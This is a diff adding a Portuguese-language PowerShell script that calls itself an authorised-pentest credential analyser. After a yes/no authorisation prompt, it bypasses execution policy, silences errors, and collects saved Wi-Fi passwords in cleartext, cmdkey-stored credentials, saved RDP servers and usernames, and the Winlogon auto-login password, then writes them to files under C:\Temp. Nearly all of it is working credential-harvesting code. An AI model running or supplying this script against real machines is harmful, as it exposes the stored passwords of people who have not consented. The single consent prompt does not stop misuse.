@@ -1,0 +1,337 @@
+<#
+.SYNOPSIS
+    Script de Análise de Credenciais - Pentest Autorizado
+.DESCRIPTION
+    Coleta informações de credenciais e senhas para análise de segurança
+    USO APENAS EM AMBIENTES CONTROLADOS COM AUTORIZAÇÃO
+.AUTHOR
+    Equipe de Segurança
+.VERSION
+    1.0
+#>
+
+# Configurações iniciais
+$ErrorActionPreference = "SilentlyContinue"
+Set-ExecutionPolicy Bypass -Scope Process -Force
+
+# Verificação de consentimento
+Write-Host "=== ANALISADOR DE CREDENCIAIS - PENTEST AUTORIZADO ===" -ForegroundColor Red
+Write-Host "AVISO: Este script coleta informacoes sensiveis" -ForegroundColor Yellow
+Write-Host "Use apenas em ambientes controlados com autorizacao" -ForegroundColor Yellow
+
+$confirm = Read-Host "`nVoce tem autorizacao escrita para executar este script? (sim/nao)"
+if ($confirm -ne "sim") {
+    Write-Host "Execucao cancelada por falta de autorizacao." -ForegroundColor Red
+    exit
+}
+
+# Configurações de saída
+$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
+$outputDir = "C:\Temp\SecurityAudit_$timestamp"
+$logFile = "$outputDir\audit_log.txt"
+$credsFile = "$outputDir\credentials_found.txt"
+$wifiFile = "$outputDir\wifi_passwords.txt"
+
+# Criar diretório de saída
+New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
+Start-Transcript -Path $logFile
+
+Write-Host "`nIniciando coleta de credenciais..." -ForegroundColor Green
+
+function Get-WiFiPasswords {
+    Write-Host "`n[+] Coletando senhas WiFi..." -ForegroundColor Cyan
+    
+    $wifiResults = @()
+    $wifiResults += "=== SENHAS WIFI SALVAS ==="
+    $wifiResults += "Coletado em: $(Get-Date)"
+    $wifiResults += "=" * 50
+    
+    try {
+        # Obter todos os perfis WiFi
+        $profiles = (netsh wlan show profiles) | Select-String "Perfil de todos os usuários" | 
+                   ForEach-Object { ($_ -split ":")[1].Trim() }
+        
+        if ($profiles.Count -eq 0) {
+            $wifiResults += "Nenhum perfil WiFi encontrado."
+            return $wifiResults
+        }
+        
+        $wifiResults += "Perfis WiFi encontrados: $($profiles.Count)"
+        $wifiResults += ""
+        
+        foreach ($profile in $profiles) {
+            $wifiResults += "Perfil: $profile"
+            $wifiResults += "-" * 30
+            
+            # Obter detalhes completos do perfil
+            $profileInfo = netsh wlan show profile name="$profile" key=clear
+            
+            # Extrair informações específicas
+            $auth = ($profileInfo | Select-String "Autenticação") -replace ".*: ",""
+            $cipher = ($profileInfo | Select-String "Criptografia") -replace ".*: ",""
+            $keyContent = ($profileInfo | Select-String "Conteúdo da Chave") -replace ".*: ",""
+            
+            $wifiResults += "Autenticacao: $auth"
+            $wifiResults += "Criptografia: $cipher"
+            
+            if ($keyContent) {
+                $wifiResults += "SENHA: $keyContent"
+            } else {
+                # Tentar método alternativo para extrair senha
+                $keyMatch = [regex]::Match($profileInfo, 'Key Content\s*:\s*([^\r\n]+)')
+                if ($keyMatch.Success) {
+                    $wifiResults += "SENHA: $($keyMatch.Groups[1].Value)"
+                } else {
+                    $wifiResults += "Senha: Nao encontrada ou rede aberta"
+                }
+            }
+            $wifiResults += ""
+        }
+    }
+    catch {
+        $wifiResults += "Erro ao coletar senhas WiFi: $($_.Exception.Message)"
+    }
+    
+    return $wifiResults
+}
+
+function Get-BrowserPasswords {
+    Write-Host "[+] Analisando navegadores..." -ForegroundColor Cyan
+    
+    $browserResults = @()
+    $browserResults += "=== CREDENCIAIS DE NAVEGADORES ==="
+    
+    # Chrome
+    try {
+        $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+        if (Test-Path $chromePath) {
+            $browserResults += "Chrome: Arquivo de login encontrado"
+            # Nota: Para ler o arquivo do Chrome precisa de descriptografia específica
+        }
+    }
+    catch { }
+    
+    # Edge
+    try {
+        $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
+        if (Test-Path $edgePath) {
+            $browserResults += "Edge: Arquivo de login encontrado"
+        }
+    }
+    catch { }
+    
+    return $browserResults
+}
+
+function Get-CredentialManager {
+    Write-Host "[+] Analisando Gerenciador de Credenciais..." -ForegroundColor Cyan
+    
+    $credManResults = @()
+    $credManResults += "=== CREDENCIAIS DO WINDOWS ==="
+    
+    try {
+        # Credenciais do Windows Vault
+        $vaultItems = @()
+        
+        # Método 1: cmdkey
+        $cmdkeyResults = cmdkey /list 2>$null
+        $credManResults += "Credenciais do CMDKEY:"
+        $credManResults += $cmdkeyResults
+        $credManResults += ""
+        
+        # Método 2: PowerShell Credential Manager
+        try {
+            $credManager = Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\*" -ErrorAction SilentlyContinue
+            if ($credManager) {
+                $credManResults += "Configuracoes de credenciais de Internet encontradas"
+            }
+        }
+        catch { }
+        
+    }
+    catch {
+        $credManResults += "Erro ao acessar Gerenciador de Credenciais: $($_.Exception.Message)"
+    }
+    
+    return $credManResults
+}
+
+function Get-SavedRDPConnections {
+    Write-Host "[+] Verificando conexoes RDP salvas..." -ForegroundColor Cyan
+    
+    $rdpResults = @()
+    $rdpResults += "=== CONEXOES RDP SALVAS ==="
+    
+    try {
+        # Conexões RDP salvas
+        $rdpPath = "HKCU:\Software\Microsoft\Terminal Server Client\Servers"
+        if (Test-Path $rdpPath) {
+            $servers = Get-ChildItem $rdpPath
+            foreach ($server in $servers) {
+                $serverName = $server.PSChildName
+                $userName = Get-ItemProperty $server.PSPath -Name "UsernameHint" -ErrorAction SilentlyContinue
+                $rdpResults += "Servidor: $serverName"
+                if ($userName) {
+                    $rdpResults += "Usuario: $($userName.UsernameHint)"
+                }
+            }
+        } else {
+            $rdpResults += "Nenhuma conexao RDP salva encontrada"
+        }
+    }
+    catch {
+        $rdpResults += "Erro ao acessar conexoes RDP: $($_.Exception.Message)"
+    }
+    
+    return $rdpResults
+}
+
+function Get-PowerShellCredentials {
+    Write-Host "[+] Verificando credenciais do PowerShell..." -ForegroundColor Cyan
+    
+    $psResults = @()
+    $psResults += "=== CREDENCIAIS DO POWERSHELL ==="
+    
+    try {
+        # Variáveis de credenciais na sessão atual
+        $credVars = Get-Variable | Where-Object { $_.Value -is [System.Management.Automation.PSCredential] }
+        
+        if ($credVars) {
+            foreach ($credVar in $credVars) {
+                $psResults += "Variavel: $($credVar.Name)"
+                $psResults += "Usuario: $($credVar.Value.UserName)"
+                # A senha é segura e não pode ser recuperada diretamente
+                $psResults += "Senha: [Protegida - nao legivel]"
+            }
+        } else {
+            $psResults += "Nenhuma credencial do PowerShell encontrada na sessao atual"
+        }
+    }
+    catch {
+        $psResults += "Erro ao verificar credenciais do PowerShell: $($_.Exception.Message)"
+    }
+    
+    return $psResults
+}
+
+function Get-AutoLoginCredentials {
+    Write-Host "[+] Verificando credenciais de auto-login..." -ForegroundColor Cyan
+    
+    $autoLoginResults = @()
+    $autoLoginResults += "=== CREDENCIAIS DE AUTO-LOGIN ==="
+    
+    try {
+        $winLogonPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+        $autoAdminLogin = Get-ItemProperty $winLogonPath -Name "AutoAdminLogon" -ErrorAction SilentlyContinue
+        $defaultUserName = Get-ItemProperty $winLogonPath -Name "DefaultUserName" -ErrorAction SilentlyContinue
+        $defaultDomain = Get-ItemProperty $winLogonPath -Name "DefaultDomainName" -ErrorAction SilentlyContinue
+        
+        if ($autoAdminLogin.AutoAdminLogon -eq "1") {
+            $autoLoginResults += "Auto-login habilitado"
+            $autoLoginResults += "Usuario: $($defaultUserName.DefaultUserName)"
+            $autoLoginResults += "Dominio: $($defaultDomain.DefaultDomainName)"
+            
+            # Tentar obter senha (pode não estar disponível)
+            $defaultPassword = Get-ItemProperty $winLogonPath -Name "DefaultPassword" -ErrorAction SilentlyContinue
+            if ($defaultPassword.DefaultPassword) {
+                $autoLoginResults += "SENHA: $($defaultPassword.DefaultPassword)"
+            }
+        } else {
+            $autoLoginResults += "Auto-login nao esta habilitado"
+        }
+    }
+    catch {
+        $autoLoginResults += "Erro ao verificar auto-login: $($_.Exception.Message)"
+    }
+    
+    return $autoLoginResults
+}
+
+function Get-NetworkCredentials {
+    Write-Host "[+] Verificando credenciais de rede..." -ForegroundColor Cyan
+    
+    $networkResults = @()
+    $networkResults += "=== CREDENCIAIS DE REDE SALVAS ==="
+    
+    try {
+        # Credenciais de compartilhamento de rede
+        $networkCreds = cmdkey /list | Where-Object { $_ -like "*target=*" }
+        
+        if ($networkCreds) {
+            foreach ($cred in $networkCreds) {
+                $networkResults += $cred
+            }
+        } else {
+            $networkResults += "Nenhuma credencial de rede encontrada"
+        }
+    }
+    catch {
+        $networkResults += "Erro ao verificar credenciais de rede: $($_.Exception.Message)"
+    }
+    
+    return $networkResults
+}
+
+# EXECUÇÃO PRINCIPAL
+try {
+    Write-Host "`n" + "="*60 -ForegroundColor Green
+    Write-Host "INICIANDO COLETA COMPLETA DE CREDENCIAIS" -ForegroundColor Green
+    Write-Host "="*60 -ForegroundColor Green
+    
+    # Coletar todas as informações
+    $allResults = @()
+    
+    $allResults += Get-WiFiPasswords
+    $allResults += ""
+    $allResults += Get-CredentialManager
+    $allResults += ""
+    $allResults += Get-BrowserPasswords
+    $allResults += ""
+    $allResults += Get-SavedRDPConnections
+    $allResults += ""
+    $allResults += Get-PowerShellCredentials
+    $allResults += ""
+    $allResults += Get-AutoLoginCredentials
+    $allResults += ""
+    $allResults += Get-NetworkCredentials
+    
+    # Salvar resultados principais
+    $allResults | Out-File -FilePath $credsFile -Encoding UTF8
+    
+    # Salvar senhas WiFi em arquivo separado
+    $wifiResults = Get-WiFiPasswords
+    $wifiResults | Out-File -FilePath $wifiFile -Encoding UTF8
+    
+    # Exibir resumo
+    Write-Host "`n" + "="*60 -ForegroundColor Green
+    Write-Host "COLETA CONCLUIDA COM SUCESSO!" -ForegroundColor Green
+    Write-Host "="*60 -ForegroundColor Green
+    
+    Write-Host "`nArquivos gerados:" -ForegroundColor Yellow
+    Write-Host "• Credenciais completas: $credsFile" -ForegroundColor White
+    Write-Host "• Senhas WiFi: $wifiFile" -ForegroundColor White
+    Write-Host "• Log de execucao: $logFile" -ForegroundColor White
+    
+    # Exibir preview das senhas WiFi encontradas
+    Write-Host "`nPreview das senhas WiFi encontradas:" -ForegroundColor Cyan
+    $wifiResults | Select-Object -First 20 | ForEach-Object { 
+        if ($_ -like "*SENHA:*") {
+            Write-Host $_ -ForegroundColor Red
+        } else {
+            Write-Host $_ -ForegroundColor Gray
+        }
+    }
+    
+    Write-Host "`nAVISO FINAL: Estes arquivos contem informacoes sensiveis." -ForegroundColor Red
+    Write-Host "Mantenha-os seguros e destrua após a análise." -ForegroundColor Red
+    
+}
+catch {
+    Write-Host "Erro durante a execucao: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "StackTrace: $($_.ScriptStackTrace)" -ForegroundColor Red
+}
+finally {
+    Stop-Transcript
+}
+
+Write-Host "`nAuditoria finalizada as $(Get-Date)" -ForegroundColor Green
